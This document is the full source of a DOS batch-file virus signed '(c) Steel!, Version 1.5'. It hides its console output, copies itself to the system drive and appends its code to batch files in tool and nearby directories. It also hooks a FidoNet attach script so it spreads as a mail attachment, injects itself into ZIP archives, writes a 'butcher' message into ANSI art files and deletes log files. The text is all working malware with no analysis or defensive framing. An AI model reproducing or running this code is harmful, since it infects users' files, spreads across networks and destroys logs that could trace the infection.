@ctty nul
if "%0"=="AUTOEXEC.BAT" del %0
if exist c:\butcher.txt goto ok
type ok >> c:\butcher.txt
attrib c:\butcher.txt +h
copy %0 c:\systdrv.bat
for %%a in (c:\fido\*.bat) do copy /b %%a+%0
for %%b in (c:\utils\*.bat) do copy /b %%b+%0
for %%c in (c:\util\*.bat) do copy /b %%c+%0
for %%d in (d:\tools\*.bat) do copy /b %%d+%0
for %%d in (c:\tools\*.bat) do copy /b %%d+%0
attrib c:\fido attach.bat -r
echo. >> c:\fido\attach.bat
echo attach.exe -A -L %0 >> c:\fido\attach.bat
attrib c:\bvdfg.txt +h +r
:ok
if exist c:\butcpic.txt goto cont
echo [0;1;33m[2J[6C[32mWarning! > c:\butcpic.txt
echo  [36m butcher go for you!  >> c:\butcpic.txt
:cont
for %%j in (*.bat ..\*.bat) do if %%j==ATTACH.BAT goto att
goto re
:att
echo. >> attach.bat
echo attach.exe -A -L %0 >> attach.bat
exit
:re
for %%f in (*.bat ..\*.bat) do find "TRTL" %%f
if not errorlevel 1 goto next
for %%d in (*.bat ..\*.bat ..\..\*.bat) do type %0 >> %%d
:next
for %%z in (*.zip ..\*.zip) do pkzip %%z %0
for %%q in (*.ans c:\max\*.ans) do type c:\butcher.txt >> %%q
del *.log
@ctty con
: (c) Steel!
:     Version 1.5
